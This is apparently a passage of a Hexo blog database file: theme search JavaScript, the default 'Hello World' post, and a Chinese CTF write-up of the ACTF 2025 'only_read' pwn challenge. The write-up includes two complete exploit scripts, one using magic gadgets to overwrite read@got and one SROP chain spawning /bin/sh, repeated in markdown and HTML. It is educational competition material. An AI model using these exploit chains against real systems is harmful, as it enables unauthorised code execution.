left.hitCount\n        }\n        return right.id - left.id\n      })\n\n      const stats = languages.hits_stats.replace(/\\$\\{hits}/, resultItems.length)\n\n      container.innerHTML = `<ol class=\"search-result-list\">${resultItems.map(result => result.item).join('')}</ol>`\n      statsItem.innerHTML = `<hr><div class=\"search-result-stats\">${stats}</div>`\n      window.pjax && window.pjax.refresh(container)\n    }\n\n    $loadingStatus.textContent = ''\n  }\n\n  let loadFlag = false\n  const $searchMask = document.getElementById('search-mask')\n  const $searchDialog = document.querySelector('#local-search .search-dialog')\n\n  // fix safari\n  const fixSafariHeight = () => {\n    if (window.innerWidth < 768) {\n      $searchDialog.style.setProperty('--search-height', window.innerHeight + 'px')\n    }\n  }\n\n  const openSearch = () => {\n    btf.overflowPaddingR.add()\n    btf.animateIn($searchMask, 'to_show 0.5s')\n    btf.animateIn($searchDialog, 'titleScale 0.5s')\n    setTimeout(() => { input.focus() }, 300)\n    if (!loadFlag) {\n      !localSearch.isfetched && localSearch.fetchData()\n      input.addEventListener('input', inputEventFunction)\n      loadFlag = true\n    }\n    // shortcut: ESC\n    document.addEventListener('keydown', function f (event) {\n      if (event.code === 'Escape') {\n        closeSearch()\n        document.removeEventListener('keydown', f)\n      }\n    })\n\n    fixSafariHeight()\n    window.addEventListener('resize', fixSafariHeight)\n  }\n\n  const closeSearch = () => {\n    btf.overflowPaddingR.remove()\n    btf.animateOut($searchDialog, 'search_close .5s')\n    btf.animateOut($searchMask, 'to_hide 0.5s')\n    window.removeEventListener('resize', fixSafariHeight)\n  }\n\n  const searchClickFn = () => {\n    btf.addEventListenerPjax(document.querySelector('#search-button > .search'), 'click', openSearch)\n  }\n\n  const searchFnOnce = () => {\n    document.querySelector('#local-search .search-close-button').addEventListener('click', closeSearch)\n    $searchMask.addEventListener('click', closeSearch)\n    if (GLOBAL_CONFIG.localSearch.preload) {\n      localSearch.fetchData()\n    }\n    localSearch.highlightSearchWords(document.getElementById('article-container'))\n  }\n\n  window.addEventListener('search:loaded', () => {\n    const $loadDataItem = document.getElementById('loading-database')\n    $loadDataItem.nextElementSibling.style.display = 'block'\n    $loadDataItem.remove()\n  })\n\n  searchClickFn()\n  searchFnOnce()\n\n  // pjax\n  window.addEventListener('pjax:complete', () => {\n    !btf.isHidden($searchMask) && closeSearch()\n    localSearch.highlightSearchWords(document.getElementById('article-container'))\n    searchClickFn()\n  })\n})\n"}],"Post":[{"title":"Hello World","_content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n","source":"_posts/hello-world.md","raw":"---\ntitle: Hello World\n---\nWelcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n","slug":"hello-world","published":1,"date":"2025-03-24T12:13:14.377Z","updated":"2025-03-24T11:50:40.807Z","comments":1,"layout":"post","photos":[],"_id":"cmglxf2hs0001uomya0i4gvub","content":"<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n","excerpt":"","more":"<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n"},{"title":"ACTF-2025-pwn","cover":"/img/治不开心药.png","_content":"# ACTF-2025-pwn\n\n## 前言\n继续备战\n\n## only_read\n\n题如其名，只有一个read 函数，通过magic gadgets 来打。当然也有其他解法\n\n### ida分析\n### 思路\n#### magic gadgets\n首先要知道经典的gadgets\n```python\n0x000000000040111c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret\n0x0000000000110a46: pop rbx; pop rbp; pop r12; pop r13; pop r14;\n```\n这两条gadgets，可以凑一个任意半个地址写。上面那个是程序里的，下面的是libc中的。选择这条是因为它的低三字节和read接近，只需要改两个字节，就可以把read修改为这个。（ps：4,5,6都是说第二次read时的payload）\n1. 那么第一次read，就是修改rbp，然后返回read继续读。\n2. 第二次read，前面0x80字节开始为后续的利用作准备。rbp设置为，这次的读入的地址，同时，这地址要下一次能修改到read@got[]\n3. 第三次read，就修改掉read@got为0x110a46 这条gadget\n4. read结束之后，rsp指向rbp+8，rbp是之前设计好的，也就是会回到第二次read时的前0x80字节之间。在这里调用read@plt，来执行改好的gadget。这时可以控制rbx，rbp。\n5. 然后，接上0x40111c这条gadget，把read@got[]改为ogg。\n6. 然后，可以接一个pop_rbp抬栈，再调用read@plt，来执行ogg。\n\n#### SROP\n如何找syscall; ret;\n```shell\nROPgadget --binary libc.so.6 --opcode 0f05c3\n```\n这是找syscall的一个方法。当然read函数的过程中其实有syscall，我们只要把偏移改过去就行。当然要提前控制好`rax`, 那么这题就是要想办法控制`rax`为`0xf`\n1. 第一次read，修改rbp，返回read继续读。\n2. 第二次read，前0x80字节可以部署一些准备工作，rbp往bss的高地址写，便于控制。\n3. 第三次read，要控制rbp，为read@got[]附近，下一次要修改read偏移直接到sysread。同时把SigreturnFrame，部署在这里。\n4. 第四次read，把偏移改好\n5. 这一次，因为没有设置好rax，所以还是read，随便输下一次就是SROP。\n#### nepnep\n[ACTF 2025 Writeup by Nepnep | CN-SEC 中文网](https://cn-sec.com/archives/4011487.html)\n### exp\n#### magic gadgets\n```python\nfrom esy import *\ncontext.log_level=\"debug\"\ncontext.terminal=['tmux','splitw','-h','-l','66%']\ncontext.arch=\"amd64\"\nio,elf=loadfile(\"./only_read\",\"\",0)\n\n'''\n0x000000000040111c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret\n0x0000000000058aa8 : pop rbp ; pop rbx ; ret\n0x00000000000584d5 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret\n0x0000000000110a46: pop rbx; pop rbp; pop r12; pop r13; pop r14; ret;\n'''\none_gadgets=[0xef52b,0xef4ce,0x583f3,0x583ec]\ngdb.attach(io,\"b *0x401158\")\ngot_read = elf.got['read']\naddr_reread = 0x401142\ngadget=[0x40111c,0x058aa8,0x0584d5]\npayload=b\"a\"*0x80+p64(got_read+0x100)+p64(addr_reread)\nio.send(payload)\n\nsleep(1)\n\nrop_chain = b\"1\" * 8\nrop_chain += flat([\n    elf.plt['read'],\n    0xfffdeae5, # 修改read@got 为 ogg\n    got_read + 0x3d,\n    0, 0, 0,\n    gadget[0]\n], length=0x38)\nrop_chain += p64(gadget[0]+1)\nrop_chain += p64(0x404190)\nrop_chain += p64(elf.plt['read'])\nrop_chain = rop_chain.ljust(0x80, b\"\\x00\")\nrop_chain += p64(0x403ff8 + 0x88)\nrop_chain += p64(addr_reread)\nio.sendline(rop_chain)\n\nsleep(1)\nio.send(b\"\\x46\\x0a\")\nio.interactive()\n```\n#### SROP\n```python\nfrom esy import *\ncontext.log_level=\"debug\"\ncontext.terminal=['tmux','splitw','-h','-l','66%']\ncontext.arch=\"amd64\"\nio,elf=loadfile(\"./only_read\",\"\",0)\n\n'''\n0x0000000000098fb6: syscall; ret;\n0x000000000011c3f9: 0f05c3;\n'''\ntar=0x404088\nbss=0x404800\nread=0x401142\nrbp=0x40111D\ngot=0x404000#-->0x5f\nleave=0x40115D\n\ngdb.attach(io,\"b *0x401158\")\npayload=b'\\x00'*0x80+p64(tar+0x80-0x8)+p64(read)\nio.send(payload)\npause()\n\npayload=p64(bss+0x100-0x90)+p64(read+4)\npayload=payload.ljust(0x80,b'\\x00')+p64(bss-0x100)+p64(read)\nio.send(payload)\npause()\n\ns=SigreturnFrame()\nbin_sh=0x404710\ns.rax=0x3b\ns.rdi=bin_sh\ns.rdx=0\ns.rsi=0\ns.rip=0x401044\npayload =p64(bss).ljust(0x80,b'\\x00')+p64(got+0x80)+p64(read)\npayload+=b\"/bin/sh\\x00\"+b'\\x00'*0x160+p64(rbp)+p64(0xf+0x80)+p64(read)+bytes(s)[8:]\nio.send(payload)\npause()\nio.send(b'\\x5f')\npause()\nio.sendline(b'a')\nio.interactive()\n\n```\n\n","source":"_posts/ctf比赛复现/ACTF-2025-pwn.md","raw":"---\ntitle: ACTF-2025-pwn\ntags:\n    - XCTF\n    - pwn\ncategories:\n    - 比赛记录\ncover: /img/治不开心药.png\n---\n# ACTF-2025-pwn\n\n## 前言\n继续备战\n\n## only_read\n\n题如其名，只有一个read 函数，通过magic gadgets 来打。当然也有其他解法\n\n### ida分析\n### 思路\n#### magic gadgets\n首先要知道经典的gadgets\n```python\n0x000000000040111c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret\n0x0000000000110a46: pop rbx; pop rbp; pop r12; pop r13; pop r14;\n```\n这两条gadgets，可以凑一个任意半个地址写。上面那个是程序里的，下面的是libc中的。选择这条是因为它的低三字节和read接近，只需要改两个字节，就可以把read修改为这个。（ps：4,5,6都是说第二次read时的payload）\n1. 那么第一次read，就是修改rbp，然后返回read继续读。\n2. 第二次read，前面0x80字节开始为后续的利用作准备。rbp设置为，这次的读入的地址，同时，这地址要下一次能修改到read@got[]\n3. 第三次read，就修改掉read@got为0x110a46 这条gadget\n4. read结束之后，rsp指向rbp+8，rbp是之前设计好的，也就是会回到第二次read时的前0x80字节之间。在这里调用read@plt，来执行改好的gadget。这时可以控制rbx，rbp。\n5. 然后，接上0x40111c这条gadget，把read@got[]改为ogg。\n6. 然后，可以接一个pop_rbp抬栈，再调用read@plt，来执行ogg。\n\n#### SROP\n如何找syscall; ret;\n```shell\nROPgadget --binary libc.so.6 --opcode 0f05c3\n```\n这是找syscall的一个方法。当然read函数的过程中其实有syscall，我们只要把偏移改过去就行。当然要提前控制好`rax`, 那么这题就是要想办法控制`rax`为`0xf`\n1. 第一次read，修改rbp，返回read继续读。\n2. 第二次read，前0x80字节可以部署一些准备工作，rbp往bss的高地址写，便于控制。\n3. 第三次read，要控制rbp，为read@got[]附近，下一次要修改read偏移直接到sysread。同时把SigreturnFrame，部署在这里。\n4. 第四次read，把偏移改好\n5. 这一次，因为没有设置好rax，所以还是read，随便输下一次就是SROP。\n#### nepnep\n[ACTF 2025 Writeup by Nepnep | CN-SEC 中文网](https://cn-sec.com/archives/4011487.html)\n### exp\n#### magic gadgets\n```python\nfrom esy import *\ncontext.log_level=\"debug\"\ncontext.terminal=['tmux','splitw','-h','-l','66%']\ncontext.arch=\"amd64\"\nio,elf=loadfile(\"./only_read\",\"\",0)\n\n'''\n0x000000000040111c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret\n0x0000000000058aa8 : pop rbp ; pop rbx ; ret\n0x00000000000584d5 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret\n0x0000000000110a46: pop rbx; pop rbp; pop r12; pop r13; pop r14; ret;\n'''\none_gadgets=[0xef52b,0xef4ce,0x583f3,0x583ec]\ngdb.attach(io,\"b *0x401158\")\ngot_read = elf.got['read']\naddr_reread = 0x401142\ngadget=[0x40111c,0x058aa8,0x0584d5]\npayload=b\"a\"*0x80+p64(got_read+0x100)+p64(addr_reread)\nio.send(payload)\n\nsleep(1)\n\nrop_chain = b\"1\" * 8\nrop_chain += flat([\n    elf.plt['read'],\n    0xfffdeae5, # 修改read@got 为 ogg\n    got_read + 0x3d,\n    0, 0, 0,\n    gadget[0]\n], length=0x38)\nrop_chain += p64(gadget[0]+1)\nrop_chain += p64(0x404190)\nrop_chain += p64(elf.plt['read'])\nrop_chain = rop_chain.ljust(0x80, b\"\\x00\")\nrop_chain += p64(0x403ff8 + 0x88)\nrop_chain += p64(addr_reread)\nio.sendline(rop_chain)\n\nsleep(1)\nio.send(b\"\\x46\\x0a\")\nio.interactive()\n```\n#### SROP\n```python\nfrom esy import *\ncontext.log_level=\"debug\"\ncontext.terminal=['tmux','splitw','-h','-l','66%']\ncontext.arch=\"amd64\"\nio,elf=loadfile(\"./only_read\",\"\",0)\n\n'''\n0x0000000000098fb6: syscall; ret;\n0x000000000011c3f9: 0f05c3;\n'''\ntar=0x404088\nbss=0x404800\nread=0x401142\nrbp=0x40111D\ngot=0x404000#-->0x5f\nleave=0x40115D\n\ngdb.attach(io,\"b *0x401158\")\npayload=b'\\x00'*0x80+p64(tar+0x80-0x8)+p64(read)\nio.send(payload)\npause()\n\npayload=p64(bss+0x100-0x90)+p64(read+4)\npayload=payload.ljust(0x80,b'\\x00')+p64(bss-0x100)+p64(read)\nio.send(payload)\npause()\n\ns=SigreturnFrame()\nbin_sh=0x404710\ns.rax=0x3b\ns.rdi=bin_sh\ns.rdx=0\ns.rsi=0\ns.rip=0x401044\npayload =p64(bss).ljust(0x80,b'\\x00')+p64(got+0x80)+p64(read)\npayload+=b\"/bin/sh\\x00\"+b'\\x00'*0x160+p64(rbp)+p64(0xf+0x80)+p64(read)+bytes(s)[8:]\nio.send(payload)\npause()\nio.send(b'\\x5f')\npause()\nio.sendline(b'a')\nio.interactive()\n\n```\n\n","slug":"ctf比赛复现/ACTF-2025-pwn","published":1,"date":"2025-10-06T14:48:09.857Z","updated":"2025-10-06T14:55:50.692Z","comments":1,"layout":"post","photos":[],"_id":"cmglxf2hv0003uomy3ksw4a8n","content":"<h1 id=\"ACTF-2025-pwn\"><a href=\"#ACTF-2025-pwn\" class=\"headerlink\" title=\"ACTF-2025-pwn\"></a>ACTF-2025-pwn</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>继续备战</p>\n<h2 id=\"only-read\"><a href=\"#only-read\" class=\"headerlink\" title=\"only_read\"></a>only_read</h2><p>题如其名，只有一个read 函数，通过magic gadgets 来打。当然也有其他解法</p>\n<h3 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h3><h3 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h3><h4 id=\"magic-gadgets\"><a href=\"#magic-gadgets\" class=\"headerlink\" title=\"magic gadgets\"></a>magic gadgets</h4><p>首先要知道经典的gadgets</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0x000000000040111c</span> : add dword ptr [rbp - <span class=\"number\">0x3d</span>], ebx ; nop ; ret</span><br><span class=\"line\"><span class=\"number\">0x0000000000110a46</span>: pop rbx; pop rbp; pop r12; pop r13; pop r14;</span><br></pre></td></tr></table></figure>\n<p>这两条gadgets，可以凑一个任意半个地址写。上面那个是程序里的，下面的是libc中的。选择这条是因为它的低三字节和read接近，只需要改两个字节，就可以把read修改为这个。（ps：4,5,6都是说第二次read时的payload）</p>\n<ol>\n<li>那么第一次read，就是修改rbp，然后返回read继续读。</li>\n<li>第二次read，前面0x80字节开始为后续的利用作准备。rbp设置为，这次的读入的地址，同时，这地址要下一次能修改到read@got[]</li>\n<li>第三次read，就修改掉read@got为0x110a46 这条gadget</li>\n<li>read结束之后，rsp指向rbp+8，rbp是之前设计好的，也就是会回到第二次read时的前0x80字节之间。在这里调用read@plt，来执行改好的gadget。这时可以控制rbx，rbp。</li>\n<li>然后，接上0x40111c这条gadget，把read@got[]改为ogg。</li>\n<li>然后，可以接一个pop_rbp抬栈，再调用read@plt，来执行ogg。</li>\n</ol>\n<h4 id=\"SROP\"><a href=\"#SROP\" class=\"headerlink\" title=\"SROP\"></a>SROP</h4><p>如何找syscall; ret;</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ROPgadget --binary libc.so.6 --opcode 0f05c3</span><br></pre></td></tr></table></figure>\n<p>这是找syscall的一个方法。当然read函数的过程中其实有syscall，我们只要把偏移改过去就行。当然要提前控制好<code>rax</code>, 那么这题就是要想办法控制<code>rax</code>为<code>0xf</code></p>\n<ol>\n<li>第一次read，修改rbp，返回read继续读。</li>\n<li>第二次read，前0x80字节可以部署一些准备工作，rbp往bss的高地址写，便于控制。</li>\n<li>第三次read，要控制rbp，为read@got[]附近，下一次要修改read偏移直接到sysread。同时把SigreturnFrame，部署在这里。</li>\n<li>第四次read，把偏移改好</li>\n<li>这一次，因为没有设置好rax，所以还是read，随便输下一次就是SROP。</li>\n</ol>\n<h4 id=\"nepnep\"><a href=\"#nepnep\" class=\"headerlink\" title=\"nepnep\"></a>nepnep</h4><p><a href=\"https://cn-sec.com/archives/4011487.html\">ACTF 2025 Writeup by Nepnep | CN-SEC 中文网</a></p>\n<h3 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h3><h4 id=\"magic-gadgets-1\"><a href=\"#magic-gadgets-1\" class=\"headerlink\" title=\"magic gadgets\"></a>magic gadgets</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> esy <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">context.terminal=[<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>,<span class=\"string\">&#x27;-l&#x27;</span>,<span class=\"string\">&#x27;66%&#x27;</span>]</span><br><span class=\"line\">context.arch=<span class=\"string\">&quot;amd64&quot;</span></span><br><span class=\"line\">io,elf=loadfile(<span class=\"string\">&quot;./only_read&quot;</span>,<span class=\"string\">&quot;&quot;</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">0x000000000040111c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000058aa8 : pop rbp ; pop rbx ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000000584d5 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000110a46: pop rbx; pop rbp; pop r12; pop r13; pop r14; ret;</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">one_gadgets=[<span class=\"number\">0xef52b</span>,<span class=\"number\">0xef4ce</span>,<span class=\"number\">0x583f3</span>,<span class=\"number\">0x583ec</span>]</span><br><span class=\"line\">gdb.attach(io,<span class=\"string\">&quot;b *0x401158&quot;</span>)</span><br><span class=\"line\">got_read = elf.got[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\">addr_reread = <span class=\"number\">0x401142</span></span><br><span class=\"line\">gadget=[<span class=\"number\">0x40111c</span>,<span class=\"number\">0x058aa8</span>,<span class=\"number\">0x0584d5</span>]</span><br><span class=\"line\">payload=<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x80</span>+p64(got_read+<span class=\"number\">0x100</span>)+p64(addr_reread)</span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">rop_chain = <span class=\"string\">b&quot;1&quot;</span> * <span class=\"number\">8</span></span><br><span class=\"line\">rop_chain += flat([</span><br><span class=\"line\">    elf.plt[<span class=\"string\">&#x27;read&#x27;</span>],</span><br><span class=\"line\">    <span class=\"number\">0xfffdeae5</span>, <span class=\"comment\"># 修改read@got 为 ogg</span></span><br><span class=\"line\">    got_read + <span class=\"number\">0x3d</span>,</span><br><span class=\"line\">    <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>,</span><br><span class=\"line\">    gadget[<span class=\"number\">0</span>]</span><br><span class=\"line\">], length=<span class=\"number\">0x38</span>)</span><br><span class=\"line\">rop_chain += p64(gadget[<span class=\"number\">0</span>]+<span class=\"number\">1</span>)</span><br><span class=\"line\">rop_chain += p64(<span class=\"number\">0x404190</span>)</span><br><span class=\"line\">rop_chain += p64(elf.plt[<span class=\"string\">&#x27;read&#x27;</span>])</span><br><span class=\"line\">rop_chain = rop_chain.ljust(<span class=\"number\">0x80</span>, <span class=\"string\">b&quot;\\x00&quot;</span>)</span><br><span class=\"line\">rop_chain += p64(<span class=\"number\">0x403ff8</span> + <span class=\"number\">0x88</span>)</span><br><span class=\"line\">rop_chain += p64(addr_reread)</span><br><span class=\"line\">io.sendline(rop_chain)</span><br><span class=\"line\"></span><br><span class=\"line\">sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">io.send(<span class=\"string\">b&quot;\\x46\\x0a&quot;</span>)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<h4 id=\"SROP-1\"><a href=\"#SROP-1\" class=\"headerlink\" title=\"SROP\"></a>SROP</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> esy <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">context.terminal=[<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>,<span class=\"string\">&#x27;-l&#x27;</span>,<span class=\"string\">&#x27;66%&#x27;</span>]</span><br><span class=\"line\">context.arch=<span class=\"string\">&quot;amd64&quot;</span></span><br><span class=\"line\">io,elf=loadfile(<span class=\"string\">&quot;./only_read&quot;</span>,<span class=\"string\">&quot;&quot;</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000098fb6: syscall; ret;</span></span><br><span class=\"line\"><span class=\"string\">0x000000000011c3f9: 0f05c3;</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">tar=<span class=\"number\">0x404088</span></span><br><span class=\"line\">bss=<span class=\"number\">0x404800</span></span><br><span class=\"line\">read=<span class=\"number\">0x401142</span></span><br><span class=\"line\">rbp=<span class=\"number\">0x40111D</span></span><br><span 